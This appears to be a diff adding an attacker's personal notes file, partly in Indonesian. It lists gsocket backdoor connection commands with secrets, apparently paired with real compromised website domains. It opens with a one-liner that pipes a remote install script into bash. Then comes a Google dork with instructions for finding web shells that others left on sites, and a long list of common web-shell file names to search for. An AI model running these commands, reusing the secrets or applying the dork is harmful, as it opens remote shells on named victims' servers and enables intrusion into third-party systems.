@@ -1,0 +1,121 @@
+Working:
+S="4bwsM6QZb2wGei4jjMM421" bash -c "$(curl -fsSL https://gsocket.io/x)"
+focaninja.com
+focaninja.com.br
+
+gs-netcat -s "2aLhHZ94au4kBpJtp6Brnw" -i
+patriarchalcollege.com
+
+gs-netcat -s "CruEHAB6rDsJiPcdT1L6zW" -i
+mulaiweb@sgn10
+putrangga.com dll web indo
+
+gs-netcat -s "215RAhDJyLTMwZBLdvRkF1" -i
+gcs.com.kh
+
+gs-netcat -s "BnsMkEReKEJQ9CjvarmSQi" -i
+numjump.com
+
+gs-netcat -s "EsAnVsHZD3vVhLJvewF12f" -i
+linkinvoicepastdue.com/cgi_bin.php
+
+gs-netcat -s "5bpokLfoG8DYKwAYKaqVA2" -i
+ytb.vn
+
+gs-netcat -s "G83j5SYHKXXqq8XkzVEHYm" -i
+trendkalteng.com
+
+new:
+gs-netcat -s "65FKmk7F7SqK9HymdctvSL" -i
+
+
+
+intitle:"index of" intext:php, 2025-07-20
+
+tanggal menyesuaikan, usahakan bulan sekarang, intext ganti ke nama file yang sering dipakai:
+0z.php  
+_Don_touch.php  
+aa.php  
+abcd.php  
+adminvseo.php  
+ajaxgoto.php  
+aku.php  
+alf.phtml  
+alfa-kaye.php  
+alfashell.php  
+alnewgoto.php  
+akc.php  
+asu.php  
+bash64.php  
+bd-xroot.php  
+bdx.php  
+betawinsec.php  
+betawinesec.php  
+blurbs.php  
+blurps yellow  
+bpkw.php
+claqxcrl.php  
+data.php  
+default.php  
+door.php  
+drei.php  
+d7net aka v1.php  
+e3ta.php  
+egcnligj.php  
+ex.php  
+fe5.php  
+file5.php  
+Free.php  
+gggak.php  
+go.php  
+GrebWP.php  
+haxor-manager.php  
+hoop.php  
+hplfuns.php  
+hxvn.php  
+jmfi2.php  
+jp.php  
+kenz.php  
+kla.php  
+koncet-MAR.shtml  
+kq1m64.php  
+lind.php  
+loader3.php  
+lock3.php  
+lock360.php  
+mah.php  
+marboro.php  
+mzntiame.php  
+nvaquxma.php  
+pluginv1.php  
+prototype.php  
+r.php  
+r4NFtVInUB5.php  
+rrgam-MAR.shtml  
+sbsnmjehoe.PhP7  
+smapphp.php  
+smap.php  
+sos.php  
+special.php  
+status506.php  
+system.php  
+takpak.php
+lass.php
+test.php  
+todo.php
+tox.php  
+upl.php  
+userfuns.php  
+v1.php  
+wolv.php  
+wp-22.php  
+wp-hekerpro.php  
+wp-inda.php  
+wp-kdmv.php  
+wp-l0gin.php  
+wp-tot.php  
+x7.php  
+xBrain.php  
+XRWWCEYNW.php  
+zu.php  
+zuk.php
